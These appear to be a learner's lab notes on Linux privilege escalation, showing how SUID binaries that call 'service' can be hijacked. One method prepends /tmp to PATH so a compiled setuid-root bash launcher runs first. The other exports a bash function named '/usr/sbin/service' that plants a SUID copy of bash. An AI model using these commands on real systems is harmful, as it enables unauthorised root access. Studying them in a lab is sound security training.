An environmental variable is a variable that are available in the entire system and that are inherited by all child processes and shells.


To see which of them are present we can run:
```bash
env
```
- ![[Pasted image 20250117143949.png]]
- `PATH` is very important in order to understand the path of the executables in the system


Sometimes we can change them and gain the root access on the system.

# Search for `SUID` set files
As usual we run:
```bash
find / -type f -perm -04000 -ls 2>/dev/null
```
- ![[Pasted image 20250117144155.png]]
- in this case we will focus on `/usr/local/bin/suid-env` and `/usr/local/bin/suid-env2` created appositely for example


# strings on `/usr/local/bin/suid-env`

We run:
```bash
strings /usr/local/bin/suid-env 
```
- ![[Pasted image 20250117144435.png]]
- we can see it starts the `apache` service

It runs this service using our path:
```bash
print $PATH
```
- ![[Pasted image 20250117144546.png]]

In fact if we run `service` it knows where it is.

But if we change the path in order to run `service` from another folder?
- we can run a malicious service


# Create malicious `service`
We can use this inline command to create a `c` file:
```bash
echo 'int main(){ setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c
```

So now we need to compile it:
```bash
gcc /tmp/service.c -o /tmp/service
```

Now we just need to change the PATH in order to run it instead of the real `service`.


# Changing the path
To do it we just need to run:
```bash
export PATH=/tmp:$PATH
```

And we can see that it is updated and the first path called is `/tmp`:
```bash
print $PATH
```
- ![[Pasted image 20250117145243.png]]



# Running the program

Now we just need to run the program seen before:
```bash
/usr/local/bin/suid-env
```
- ![[Pasted image 20250117145341.png]]

<mark style="background: #BBFABBA6;">We gain the root shell!</mark>


But what happens when the program calls a direct path?


# Calling  direct path /usr/sbin/service

The second file we have seen was `/usr/local/bin/suid-env2`.

In this case it's a little bit different:
```bash
strings /usr/local/bin/suid-env2
```
-  ![[Pasted image 20250117145628.png]]
- it calls the direct path `/usr/sbin/service`

In this specific case we need to create a malicious function and not a file as before.

# malicious function creation
So we just need to go into `/tmp` and create a mlaicious function `/usr/sbin/service`

Inline creation:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
```
- we have created it

Now we need to export the function as if was a path:
```bash
export -f /usr/sbin/service
```

So when we will run:
```bash
/usr/local/bin/suid-env2
```
- it will call `/usr/sbin/service` that is a function exported as environmental variable
  
The function will pop a shell as root:
- ![[Pasted image 20250117150148.png]]


We have to do the creation and export each time we run the binary `/usr/local/bin/suid-env2`


<mark style="background: #BBFABBA6;">We gain a root shell!</mark>

